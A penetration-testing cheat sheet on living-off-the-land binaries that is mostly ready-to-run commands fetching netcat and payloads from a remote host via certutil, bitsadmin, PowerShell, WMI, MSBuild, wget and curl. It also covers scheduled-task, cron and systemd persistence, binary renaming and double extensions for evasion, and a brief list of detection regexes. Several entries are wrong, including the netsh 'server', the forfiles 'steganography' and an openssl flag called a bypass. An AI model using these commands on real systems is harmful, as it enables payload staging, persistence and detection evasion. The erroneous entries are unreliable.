# 🛰️ Living Off The Land Binaries (LOLBins) for Penetration Testing

## Introduction 🔍

Living off the land binaries (LOLBins) are legitimate system tools that can be used by attackers to perform malicious activities while avoiding detection by security systems. This guide provides a comprehensive overview of LOLBins, including command-line methods and PowerShell scripts to download files using native Windows commands.

[!ABSTRACT] This guide details how to use LOLBins for file transfer in penetration testing scenarios on both Windows and Linux environments.

## Command-Line Methods 🚀

### Downloading Files via Command Line

#### Windows 🪟

##### Certutil.exe
```cmd
certutil -urlcache -split -f http://10.10.10.32:8000/nc.exe C:\temp\nc.exe
```

[!WARNING] Ensure to use trusted sources and avoid downloading from malicious URLs.

##### Bitsadmin.exe
```cmd
bitsadmin /transfer "myDownloadJob" /priority normal http://10.10.10.32:8000/nc.exe C:\temp\nc.exe
```

[!CHECK] Verify that the BITS service is running on the target system.

##### PowerShell (Invoke-WebRequest)
```powershell
Invoke-WebRequest -Uri "http://10.10.10.32:8000/nc.exe" -OutFile "C:\temp\nc.exe"
```

[!INFO] Use `certutil` or `bitsadmin` if PowerShell is restricted.

##### Netsh Command
```cmd
netsh.exe http add urlacl url=http://+:8000/ user=everyone
```
This sets up a basic HTTP server to serve files. Download using:
```cmd
powershell.exe -c "(New-Object Net.WebClient).DownloadFile('http://127.0.0.1:8000/payload','C:\temp\payload')"
```

#### Linux 🐧

##### Wget
```bash
wget http://10.10.10.32:8000/nc -O /tmp/nc
```

[!CHECK] Ensure `wget` is installed and available.

##### Curl
```bash
curl -s http://10.10.10.32:8000/nc > /tmp/nc
```
[!WARNING] Use `-k` or `--insecure` for untrusted SSL certificates.
```bash
curl -sk https://10.10.10.32:8443/payload > /tmp/payload
```

##### Perl and Python
```perl
# Perl Example
use LWP::UserAgent;
my $ua = new LWP::UserAgent;
$ua->get('http://10.10.10.32:8000/nc', ':content_file' => '/tmp/nc');
```
```python
import urllib.request

url = 'http://10.10.10.32:8000/payload'
urllib.request.urlretrieve(url, '/tmp/payload')
```

## PowerShell Scripts 🐛

### Using Powershell for HTTP Request

#### Windows PowerShell Script
```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.10.32:8000/nc.exe','C:\temp\nc.exe')
```

[!WARNING] Be cautious with this command as it can bypass many security restrictions.

## Execution via WMI 🪄

### Using WMI for HTTP Request
```powershell
$wmi = [WMIClass]"Win32_Process"
$wmi.Create("powershell.exe -c `"(New-Object Net.WebClient).DownloadFile('http://10.10.10.32:8000/nc.exe','C:\temp\nc.exe')`"")
```

[!DANGER] This method can be used to evade detection and persistence.

## MSBuild for Execution 🛠️

### Download and Execute via MSBuild
```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Download">
    <Exec Command="powershell.exe -c (New-Object Net.WebClient).DownloadFile('http://10.10.10.32:8000/nc.exe','C:\temp\nc.exe')" />
  </Target>
</Project>
```
```cmd
msbuild.exe download.xml
```

[!SUCCESS] This method can be used to run PowerShell scripts without triggering alerts.

## Linux Systemd for Persistence 🛠️

### Create Service for File Transfer
```bash
# Create service file
cat > /tmp/download.service << EOF
[Unit]
Description=Download Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'curl -o /tmp/payload http://10.10.10.32:8000/payload'

[Install]
WantedBy=multi-user.target
EOF

# Run service
systemctl --user daemon-reload
systemctl --user start download.service
```

## Steganography with LOLBins 🌈

### Hide Data in Images
#### Windows - Using forfiles:
```cmd
forfiles /p C:\temp /m *.jpg /c "cmd /c echo secret_data >> @file:metadata"
```
#### Linux - Using steghide:
```bash
# Hide file in image
steghide embed -cf cover.jpg -ef secret.txt -p password123

# Extract file from image
steghide extract -sf cover.jpg -p password123
```

## Detection Evasion Techniques 🛡️

### Rename Binaries
#### Windows:
```cmd
copy C:\Windows\System32\certutil.exe C:\temp\update.exe
update.exe -urlcache -split -f http://10.10.10.32:8000/nc.exe
```
#### Linux:
```bash
cp /usr/bin/wget /tmp/systemupdate
/tmp/systemupdate http://10.10.10.32:8000/payload
```

### Use Legitimate File Extensions
#### Disguise Executables:
```cmd
copy nc.exe important_document.pdf.exe
# Use double extension
copy nc.exe report.txt.exe
```

### Time-based Transfers
#### Schedule Transfers:
```cmd
# Windows - Use schtasks
schtasks /create /tn "System Update" /tr "certutil.exe -urlcache -split -f http://10.10.10.32:8000/update.exe" /sc daily /st 4:00

# Linux - Use cron
echo "4 4 * * * wget -q http://10.10.10.32:8000/payload" | crontab -
```

## Defensive Considerations 🛡️

### Monitoring LOLBins Usage
#### Windows Event Logs:
- Monitor Process Creation Events (Event ID 4688)
- Monitor PowerShell Script Block Logging (Event ID 4104)
- Monitor Network Connections (Event ID 3 - Sysmon)

#### Linux Monitoring:
- Monitor syscalls with auditd
- Use process monitoring tools (ps, top, htop)
- Monitor network connections (netstat, ss)

### Common Detection Signatures
**Suspicious Command Lines:**
```cmd
# Certutil with URL
certutil.*-urlcache.*-split.*-f.*http

# Bitsadmin with transfer
bitsadmin.*transfer.*http

# PowerShell with download
powershell.*downloadstring.*http
```

### Mitigation Strategies
1. **Application Whitelisting** - Prevent unauthorized binary execution
2. **Network Monitoring** - Monitor outbound connections
3. **Behavioral Analysis** - Detect unusual binary usage patterns
4. **Endpoint Detection** - Use EDR solutions to detect LOLBin abuse
5. **User Education** - Train users to recognize suspicious activities

## Best Practices for Penetration Testers 🧪

### Reconnaissance Phase
1. **Enumerate available binaries** on target systems
2. **Check binary versions** and capabilities
3. **Identify network restrictions** that may affect transfers
4. **Research alternative methods** for detected/blocked binaries

### Execution Phase
1. **Start with least suspicious methods** first
2. **Use legitimate-looking file names** and extensions
3. **Time transfers appropriately** to avoid detection
4. **Clean up artifacts** after successful transfers
5. **Document successful techniques** for future use

### Testing Methodology
```bash
# Quick binary availability check
which wget curl nc openssl base64 python perl ruby

# Windows binary check
where certutil bitsadmin powershell wmic
```

## Troubleshooting Common Issues 🚨

### Certificate Errors
#### Bypass SSL Certificate Validation:
```bash
# Curl
curl -k https://10.10.10.32:8000/file.txt

# Wget
wget --no-check-certificate https://10.10.10.32:8000/file.txt

# OpenSSL
openssl s_client -connect 10.10.10.32:443 -verify_return_error
```

### Network Restrictions
#### Verify Connections:
```bash
ping 10.10.10.32
nc -zv 10.10.10.32 8000
```
Use `curl` or `wget` with the `-I` flag to check if a connection can be established.

### Rename Binaries Verification:
```bash
ls /tmp/systemupdate
file /tmp/systemupdate
```

## References 📚

- [Windows Event IDs](https://www.ultimatewindowssecurity.com/securitylog/)
- [Sysmon Documentation](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [auditd Documentation](http://man7.org/linux/man-pages/man8/auditd.conf.8.html)

---

[!ABSTRACT] This guide provides a thorough understanding of how to leverage native system tools for file transfer and evasion techniques in penetration testing scenarios.

--- 

# 🛡️ Conclusion

This comprehensive guide offers various methods for using LOLBins to perform malicious activities while evading detection. Ensure compliance with ethical hacking principles and legal regulations when conducting penetration tests. Always prioritize security and integrity during your operations.